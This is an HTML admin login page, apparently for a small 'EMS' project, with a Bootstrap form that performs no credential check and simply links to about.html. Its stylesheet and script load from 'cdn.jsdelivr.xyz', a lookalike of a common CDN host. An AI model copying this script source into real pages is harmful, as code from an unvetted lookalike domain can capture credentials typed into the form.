<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EMS</title>
    <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
    />
<script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
</head>
<body class="bg-light">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-4">
                <div class="shadow-lg  mb-5 bg-body rounded">
                 <div class="card mt-5">
                    <div class="card-header text-bg-dark">Log in as admin</div>
                    <div class="card-body">
                        <form action="about.html">
                            <div class="form-floating">
                                <input type="text" id="username" class="form-control mb-3" placeholder="User Name" autofocus>
                                <label for="username">User Name</label>
                            </div>
                            <div class="form-floating">
                                <input type="password" id="password" class="form-control mb-3" placeholder="Password">
                                <label for="password">Password</label>
                            </div>
                            <div class="form-check mb-3">
                                <input type="checkbox" class="form-check-input" id="check">
                                <label for="check">Remember Me</label>
                            </div>
                            <a style="text-decoration: none;" href="./about.html">
                                <div class="d-grid">
                                    <button type="submit" class="btn btn-warning"><i class="fa-solid fa-right-to-bracket p-2"></i>Login as admin</button>
                                </div>
                            </a>
                        </form>
                    </div>
                 </div>
                </div>
            </div>
        </div>
    </div>
    



  
</body>
</html>
